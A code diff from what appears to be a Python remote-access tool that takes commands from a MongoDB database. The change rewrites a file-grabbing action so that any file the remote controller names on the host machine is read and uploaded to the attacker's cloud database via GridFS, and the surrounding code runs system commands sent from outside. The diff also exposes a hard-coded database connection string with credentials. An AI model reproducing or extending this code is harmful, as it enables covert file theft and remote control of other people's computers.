@@ -9,7 +9,7 @@ import shutil
 import numpy as np
 import requests
 import win32clipboard
-
+import gridfs
 
 con = "mongodb+srv://utsav:utsav@cluster0.rqeuq69.mongodb.net/?retryWrites=true&w=majority"
 
@@ -224,15 +224,23 @@ def action_take(listen):
             upload(data)
         elif action=='getalltypefiles':
             target_element=listen['target_element']
-            with open(cwd+f"\{target_element}",'rb') as f:
-                binary=f
-                data={
-                "hostname":hostname,
-                "result":(binary.read().decode('latin-1')),
-                "filename":target_element
-
-                }
-                upload(data)
+            list_coll=db.list_collection_names()
+            for i in list_coll:
+                if i=='fs.files':
+                    col=db['fs.files']
+                    col.drop()
+                if i=='fs.chunks':
+                    coll=db['fs.chunks']
+                    coll.drop()
+            path=cwd+f"\{target_element}"
+            try:
+               file_data=open(path,'rb')
+               data=file_data.read()
+               fs=gridfs.GridFS(db)
+               fs.put(data,filename=target_element)
+               file_data.close() 
+            except:
+                pass
         elif listen['is_systemCommand']==1:
             cmd=listen['action']
             try:
